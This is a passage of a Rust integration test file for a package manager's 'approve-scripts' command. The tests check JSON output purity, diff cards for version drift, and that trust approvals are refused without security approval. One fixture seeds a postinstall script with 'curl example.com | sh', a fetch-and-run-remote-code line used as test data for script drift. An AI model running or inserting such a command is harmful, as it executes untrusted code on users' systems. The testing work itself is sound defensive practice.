    let project = TempProject::empty("");
    seed_store_pkg_with_postinstall(&project, "shapeshift", "1.0.0", "echo hi");
    seed_store_pkg_with_postinstall(
        &project,
        "shapeshift",
        "2.0.0",
        "echo hi\ncurl example.com | sh",
    );
    write_project_with_prior_binding(&project, "shapeshift", "1.0.0", "sha256-v1", None, None);
    write_blocked_build_state_with_drift(&project, "shapeshift", "2.0.0", "sha256-v2", None, None);

    let out = lpm(&project)
        .args(["--json", "approve-scripts", "--list"])
        .output()
        .expect("spawn lpm approve-scripts --json");
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    assert!(out.status.success());

    // Stdout MUST be exactly one parseable JSON document.
    let _: serde_json::Value = serde_json::from_str(stdout.trim()).unwrap_or_else(|e| {
        panic!("stream separation broken — stdout under --json must be one parseable JSON document. Parse error: {e}\nstdout:\n{stdout}")
    });
}

/// First-time review (no prior binding) must NOT render a diff card
/// AND must emit `version_diff: null` in the JSON. Pins the
/// no-prior-to-compare-against shape.
#[test]
fn approve_scripts_first_time_review_emits_null_version_diff_and_no_card() {
    let project = TempProject::empty("");
    seed_store_pkg_with_postinstall(&project, "first-timer", "1.0.0", "node build.js");
    // Manifest has NO trustedDependencies entry — first-time review.
    project.write_file(
        "package.json",
        r#"{"name":"approve-scripts-first-time","version":"0.0.1","lpm":{}}"#,
    );
    write_blocked_build_state_with_drift(
        &project,
        "first-timer",
        "1.0.0",
        "sha256-first-timer",
        None,
        None,
    );

    // Human path: no diff card.
    let out_human = lpm(&project)
        .args(["approve-scripts", "--list"])
        .output()
        .expect("spawn lpm approve-scripts --list");
    let stdout_human = strip_ansi(&String::from_utf8_lossy(&out_human.stdout));
    assert!(out_human.status.success());
    assert!(
        !stdout_human.contains("changes since"),
        "first-time review must NOT emit a diff card; stdout:\n{stdout_human}"
    );

    // JSON path: version_diff is null.
    let out_json = lpm(&project)
        .args(["--json", "approve-scripts", "--list"])
        .output()
        .expect("spawn lpm approve-scripts --json");
    let stdout_json = strip_ansi(&String::from_utf8_lossy(&out_json.stdout));
    let parsed: serde_json::Value = serde_json::from_str(stdout_json.trim())
        .unwrap_or_else(|e| panic!("invalid JSON: {e}\nstdout:\n{stdout_json}"));
    let entry = &parsed["blocked"][0];
    assert!(
        entry["version_diff"].is_null(),
        "first-time review must emit version_diff: null; entry={entry}"
    );
}

// ─── audit regression tests ─────────────────────────
//
// Three audit regression tests, end-to-end:
//  - **Legacy bare-name upgrade:** legacy `["esbuild"]` upgrades to `esbuild@*` after
//    `--yes` and stays trusted on the next install (no re-block).
//  - **Filter by current install state:** `--list` filters persisted state through CURRENT
//    trust — already-approved entries are not in the output.
//  - **JSON stream purity:** every `--json` invocation produces exactly ONE
//    valid JSON object on stdout (no tracing/WARN bleed).

/// Synthesize `.lpm/build-state.json` with the supplied
/// `(name, version, integrity, script_hash)` entries. Uses the
/// post-P7 shape (`static_tier: "green"`, `published_at`) so the
/// state passes the schema reader's expectations even if newer
/// fields become required.
fn write_build_state_audit(project: &TempProject, entries: &[(&str, &str, &str, &str)]) {
    let blocked: Vec<serde_json::Value> = entries
        .iter()
        .map(|(name, version, integrity, script_hash)| {
            serde_json::json!({
                "name": name,
                "version": version,
                "integrity": integrity,
                "script_hash": script_hash,
                "phases_present": ["postinstall"],
                "binding_drift": false,
                "static_tier": "green",
                "published_at": "2026-04-22T00:00:00Z"
            })
        })
        .collect();
    let state = serde_json::json!({
        "state_version": 1,
        "blocked_set_fingerprint": "sha256-cli-audit-fixture",
        "captured_at": "2026-04-11T00:00:00Z",
        "blocked_packages": blocked,
    });
    project.write_file(
        ".lpm/build-state.json",
        &serde_json::to_string_pretty(&state).unwrap(),
    );
}

fn assert_security_approval_scope(out: &std::process::Output, expected_scope: &str) {
    let envelope = assertions::assert_security_approval_required(out);
    let scopes = envelope["error"]["requested_scopes"]
        .as_array()
        .unwrap_or_else(|| panic!("security approval envelope must include scopes: {envelope}"));
    assert!(
        scopes.iter().any(|scope| scope == expected_scope),
        "security approval envelope must include scope `{expected_scope}`; got {envelope}",
    );
}

/// A legacy `trustedDependencies: ["esbuild"]` that gets upgraded
/// to the rich `esbuild@*` sentinel during `--yes` approval MUST
/// NOT clear esbuild from the blocked set on a subsequent install
/// where it appears as a concrete version. The `@*` sentinel is a
/// migration marker, not a trust grant; the user must re-approve
/// the concrete version via `lpm approve-scripts`, which writes a
/// `esbuild@0.25.1` Rich entry with content-bound
/// `(integrity, script_hash)`. Honoring the sentinel for trust
/// would auto-trust every future version under the inherited
/// name-only approval (cross-version trust laundering).
#[test]
fn approve_scripts_at_star_sentinel_upgrade_requires_security_approval() {
    let project = TempProject::empty(
        r#"{
  "name": "approve-scripts-at-star-sentinel-fixture",
  "version": "0.0.0",
  "lpm": { "trustedDependencies": ["esbuild"] }
}"#,
    );
    write_build_state_audit(
        &project,
        &[("sharp", "0.32.1", "sha512-sharp-int", "sha256-sharp-h")],
    );

    let before = project.read_file("package.json");
    let out = lpm(&project)
        .args(["--json", "approve-scripts", "--yes"])
        .output()
        .expect("spawn lpm approve-scripts --yes");
    assert_security_approval_scope(&out, "trust-bulk-approve");
    assert_eq!(
        project.read_file("package.json"),
        before,
        "legacy trustedDependencies must not be upgraded without approval",
    );
}

/// **Filter-by-current-state regression.** `approve-scripts --list` filters persisted
/// state through CURRENT trust — after `--yes` approves esbuild, the
/// next `--list` call must NOT report it as blocked even if the state
/// file still records it.
#[test]
fn approve_scripts_yes_requires_security_approval_and_list_remains_blocked() {
    let project = TempProject::empty(r#"{"name":"audit-d-impl-2-list","version":"0.0.0"}"#);
    write_build_state_audit(
        &project,
        &[(
            "esbuild",
            "0.25.1",
            "sha512-esbuild-int",
            "sha256-esbuild-h",
        )],
    );

    // Attempt to approve esbuild via --yes. Workflow tests do not mint
    // native approval, so the write must be refused.
    let out1 = lpm(&project)
        .args(["--json", "approve-scripts", "--yes"])
        .output()
        .expect("spawn lpm approve-scripts --yes");
    assert_security_approval_scope(&out1, "trust-bulk-approve");

    // --list --json: the persisted state still records esbuild as
    // blocked because no manifest trust write occurred.
    let out2 = lpm(&project)
        .args(["--json", "approve-scripts", "--list"])
        .output()
        .expect("spawn lpm approve-scripts --list --json");
    assert!(out2.status.success(), "list --json must succeed");
    let parsed: serde_json::Value =
        serde_json::from_str(&strip_ansi(&String::from_utf8_lossy(&out2.stdout))).unwrap();
    assert_eq!(
        parsed["blocked_count"].as_u64(),
        Some(1),
        "esbuild must remain blocked after refused approval; envelope: {parsed:#}"
    );
    assert_eq!(
        parsed["blocked"].as_array().map(|a| a.len()),
        Some(1),
        "blocked array must still contain esbuild"
    );
}

/// **Filter-by-current-state — explicit-name path.** When the user explicitly names
/// an already-approved package, the binary must error with "already
/// approved" rather than silently re-approving.
#[test]
fn approve_scripts_specific_pkg_arg_for_already_approved_emits_friendly_error() {
    let project = TempProject::empty(
        r#"{
  "name": "audit-d-impl-2-pkg",
  "version": "0.0.0",
  "lpm": {
    "trustedDependencies": {
      "esbuild@0.25.1": {
        "integrity": "sha512-esbuild-int",
        "scriptHash": "sha256-esbuild-h"
      }
    }
  }
}"#,
    );
    write_build_state_audit(
        &project,
        &[(
            "esbuild",
            "0.25.1",
            "sha512-esbuild-int",
            "sha256-esbuild-h",
        )],
    );

    let out = lpm(&project)
        .args(["approve-scripts", "esbuild"])
        .output()
        .expect("spawn lpm approve-scripts esbuild");
    assert!(
        !out.status.success(),
        "approving an already-approved package must error; stdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    let combined = strip_ansi(&format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    ));
    assert!(
        combined.contains("already approved"),
        "expected 'already approved' message; got:\n{combined}"
    );
}

/// **Stream-purity regression — guarded `--yes --json`.** The live
/// `--yes` path now stops at the security approval boundary, but stdout
/// still must be exactly one valid JSON error object.
#[test]
fn approve_scripts_yes_json_security_error_is_exactly_one_valid_json_payload_on_stdout() {
    let project = TempProject::empty(r#"{"name":"audit-d-impl-3-yes","version":"0.0.0"}"#);
    write_build_state_audit(&project, &[("esbuild", "0.25.1", "sha512-int", "sha256-h")]);

    let out = lpm(&project)
        .args(["--json", "approve-scripts", "--yes"])
        .output()
        .expect("spawn lpm approve-scripts --json --yes");

    let stdout_clean = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    let parsed: serde_json::Value = serde_json::from_str(&stdout_clean).unwrap_or_else(|e| {
        panic!(
            "stdout must be valid JSON: {e}\nstdout (first 500 chars):\n{}\nstderr (first 500 chars):\n{}",
            stdout_clean.chars().take(500).collect::<String>(),
            String::from_utf8_lossy(&out.stderr).chars().take(500).collect::<String>()
        )
    });

    assert_eq!(parsed["success"].as_bool(), Some(false));
    assert_eq!(
        parsed["error"]["code"].as_str(),
        Some("SECURITY_APPROVAL_REQUIRED")
    );

    // CRITICAL: stdout must NOT contain the WARN text.
    assert!(
        !stdout_clean.contains("WARN"),
        "stdout must NOT contain WARN — that's the audit-caught bug; stdout:\n{stdout_clean}"
    );
    assert!(
        !stdout_clean.contains("blanket-approves"),
        "stdout must NOT contain warning prose; stdout:\n{stdout_clean}"
    );
}

/// **Stream-purity — `--list --json`.** The
/// stream-separation contract holds for every `--json` invocation, not
/// just `--yes --json`. This test exercises the path that emits no
/// warnings at all — the subscriber-to-stdout bug would have shown up
/// here too.
#[test]
fn approve_scripts_list_json_emits_exactly_one_valid_json_payload_on_stdout() {
    let project = TempProject::empty(r#"{"name":"audit-d-impl-3-list","version":"0.0.0"}"#);
    write_build_state_audit(&project, &[("esbuild", "0.25.1", "sha512-i", "sha256-h")]);

    let out = lpm(&project)
        .args(["--json", "approve-scripts", "--list"])
        .output()
        .expect("spawn lpm approve-scripts --list --json");
    assert!(out.status.success(), "list --json must succeed");

    let stdout_clean = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    let parsed: serde_json::Value = serde_json::from_str(&stdout_clean)
        .unwrap_or_else(|e| panic!("stdout must be valid JSON: {e}\nstdout:\n{stdout_clean}"));
    assert_eq!(parsed["success"].as_bool(), Some(true));
    assert_eq!(parsed["schema_version"].as_u64(), Some(3));
    assert!(
        !stdout_clean.contains("WARN"),
        "stdout must NOT contain WARN; stdout:\n{stdout_clean}"
    );
}

/// **Stream-purity error path — `--yes --json` with no state file** still
/// emits clean JSON on stdout. Errors follow the same stream-separation
/// contract.
#[test]
fn approve_scripts_yes_json_with_no_state_file_emits_clean_error_json_on_stdout() {
    let project = TempProject::empty(r#"{"name":"audit-d-impl-3-error","version":"0.0.0"}"#);
    // No build-state file — error path.

    let out = lpm(&project)
        .args(["--json", "approve-scripts", "--yes"])
        .output()
        .expect("spawn lpm approve-scripts --json --yes (no state)");
    assert!(
        !out.status.success(),
        "missing state file must produce non-zero exit"
    );

    let stdout_clean = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    let parsed: serde_json::Value = serde_json::from_str(&stdout_clean)
        .unwrap_or_else(|e| panic!("error JSON should still parse: {e}\nstdout:\n{stdout_clean}"));
    assert_eq!(parsed["success"].as_bool(), Some(false));
}
